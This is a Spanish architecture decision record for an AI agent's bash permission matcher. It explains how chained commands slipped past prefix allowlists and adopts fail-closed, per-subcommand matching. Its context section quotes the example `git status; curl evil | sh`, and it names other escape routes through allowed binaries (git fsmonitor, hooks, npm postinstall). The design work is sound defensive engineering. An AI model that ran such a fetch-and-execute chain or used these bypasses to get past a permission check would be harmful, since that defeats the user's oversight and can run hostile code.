---
title: "Los permisos de `bash` se emparejan por subcomando con un tokenizador cerrado y fallan hacia `ask`"
type: "adr"
id: "ADR-023"
status: "aceptada"
date: "2026-07-16"
---
# ADR-023 · Los permisos de `bash` se emparejan por subcomando con un tokenizador cerrado y fallan hacia `ask`

**Estado:** Aceptada · 2026-07-16 (resuelve
[G53](../../findings/g53-la-semantica-de-emparejamiento.md),
origen SEC-02 de la
[auditoría de seguridad 2026-07-16](../../audits/auditoria-seguridad-2026-07-16.md);
no toca [api.md](../../contracts/api.md) ni `enu.version.api` — los permisos son vocabulario
de producto y viven en la extensión `agent`)

**Contexto.** Los permisos del agente son patrones `tool[:argumento]`
([agente.md](../../contracts/agente.md) §5), pero ningún documento fijaba el algoritmo de
emparejamiento. Con el glob implícito sobre el string crudo del comando,
`allow = { "bash:git *" }` equivalía a `bash:*`: basta encadenar
(`git status; curl evil | sh`) para que el prefijo casado arrastre un comando
arbitrario. Es decir, la defensa **anunciada** del contexto headless/CI — el
más expuesto a prompt injection, según la propia razón del default de §5 —
era una frontera falsa (SEC-02). El extremo opuesto tampoco sirve para v1:
emparejar contra el programa *parseado* exige un parser de bash completo —
un proyecto de seguridad en sí mismo, y una primitiva de kernel nueva con un
único consumidor.

**Decisión.** El **modelo del matcher de Claude Code, adaptado**,
especificado como contrato en [agente.md](../../contracts/agente.md) §5:

1. **Match general**: patrón sin `:` = nombre exacto de la tool; `tool:arg` =
   glob anclado (`*` ⇒ `.*`, `^…$`, resto de caracteres literales) sobre la
   representación textual del argumento principal de la tool.
2. **`bash` descompone por operadores**: el comando se parte por los
   separadores reconocidos (`&&`, `||`, `;`, `|`, `|&`, `&`, saltos de línea)
   con un tokenizador que modela **solo** palabras planas y strings entre
   comillas simples o dobles. Un `allow` concede únicamente si **cada**
   subcomando casa algún patrón `allow`.
3. **Fail-closed con allowlist cerrada de constructos**: sustitución de
   comandos (`$( )`, backticks), expansión `$VAR` en posición de comando,
   redirecciones, heredocs, subshells y agrupaciones, o comillas
   desbalanceadas invalidan todo `allow` y la petición cae a `ask` (deny en
   headless). Lo que el tokenizador no entiende falla hacia pedir permiso,
   nunca hacia conceder (doctrina de P17: hacerlo *casi* bien es peor que no
   tenerlo).
4. **`deny` casa si algún subcomando casa**, conserva su precedencia absoluta
   en el pipeline y queda documentado como **best-effort** (doctrina G16:
   `/bin/rm`, aliases y variantes no se prometen).
5. **"Permitir siempre" sobre un comando compuesto persiste una regla por
   subcomando** ([chat.md](../../contracts/chat.md) §5, P29), no el string encadenado.

El salto al programa parseado queda pospuesto con disparador doble
([P39](../../postponed/pospuesto.md)).

**Consecuencias.**

- El encadenamiento deja de ser bypass: `allow = { "bash:git *" }` vuelve a
  significar lo que su sintaxis sugiere, y la promesa de §5 ("auditable de un
  vistazo") vuelve a ser cierta para lo que el allowlist nombra.
- El precio del fail-closed es fricción: comandos legítimos con constructos
  no modelables caen a `ask` (y en headless, a deny). Esa fricción, si se
  documenta y duele, es exactamente el disparador de P39 — el diseño convierte
  su propio coste en la señal de reapertura.
- La **advertencia honesta** queda en los contratos ([agente.md](../../contracts/agente.md)
  §5, [guia-plugins.md](../../contracts/guia-plugins.md)): ni `allow` ni `deny` acotan lo que
  un binario permitido ejecuta por dentro (`git -c core.fsmonitor=…`, hooks
  de git, `postinstall` de npm). El emparejamiento decide qué comandos
  arrancan; la valla dura para código no confiable siguen siendo los workers
  con `caps` — la distinción capa blanda / capa dura que §5 ya hacía.
- La lista de separadores y constructos modelables es **cerrada por
  contrato**: ampliarla es un cambio de contrato (revisión de §5 y, si
  procede, nueva entrada aquí), no un detalle de implementación. Un
  tokenizador que "entendiera más" sin registro reabriría la grieta en
  silencio.
- "Nombre exacto, sin glob" deja sin efecto el patrón
  `allow = {"mcp__<servidor>__*"}` que [arquitectura.md](../../core/arquitectura.md)
  ejemplificaba para autorizar un servidor MCP entero (actualizado):
  autorizarlo es enumerar sus tools o conceder por hook `permission`. Es
  deliberado — un glob sobre nombres reintroduciría por la puerta de atrás
  la ambigüedad de match que este ADR cierra.
---
